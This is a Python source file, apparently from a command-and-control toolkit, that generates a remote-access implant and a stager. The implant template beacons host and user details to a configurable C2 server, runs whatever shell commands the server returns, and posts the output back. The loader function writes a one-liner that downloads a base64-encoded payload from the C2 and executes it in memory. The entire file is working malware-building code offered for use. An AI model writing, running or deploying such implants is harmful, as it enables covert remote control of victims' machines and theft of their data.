import os

IMPLANT_TEMPLATE = '''import os
import socket
import subprocess
import time
import json
import urllib.request

C2 = "{c2_url}"
SECRET = "{secret}"
SLEEP = {sleep}

def sysinfo():
    return {{
        "host": socket.gethostname(),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "os": os.name,
        "secret": SECRET,
    }}

def post(path, payload):
    req = urllib.request.Request(
        C2 + path,
        data=json.dumps(payload).encode(),
        headers={{"Content-Type": "application/json"}},
    )
    return urllib.request.urlopen(req, timeout=30).read().decode()

def run(cmd):
    try:
        return subprocess.getoutput(cmd)
    except Exception as e:
        return f"ERR: {{e}}"

def loop():
    while True:
        try:
            r = post("/beacon", sysinfo())
            if r:
                data = json.loads(r)
                cmd = data.get("cmd")
                if cmd:
                    out = run(cmd)
                    post("/output", {{"secret": SECRET, "output": out}})
        except Exception:
            pass
        time.sleep(SLEEP)

if __name__ == "__main__":
    loop()
'''

def build_python_implant(c2_url, secret, out_path, sleep=10):
    code = IMPLANT_TEMPLATE.format(c2_url=c2_url, secret=secret, sleep=sleep)
    os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
    with open(out_path, "w") as f:
        f.write(code)
    return out_path

def build_loader(c2_url, secret, out_path, sleep=10):
    """tiny one-liner loader that downloads and runs the implant in-memory."""
    code = (
        "import urllib.request,base64;"
        f"exec(base64.b64decode(urllib.request.urlopen('{c2_url}/stage?secret={secret}').read()))"
    )
    with open(out_path, "w") as f:
        f.write(code)
    return out_path
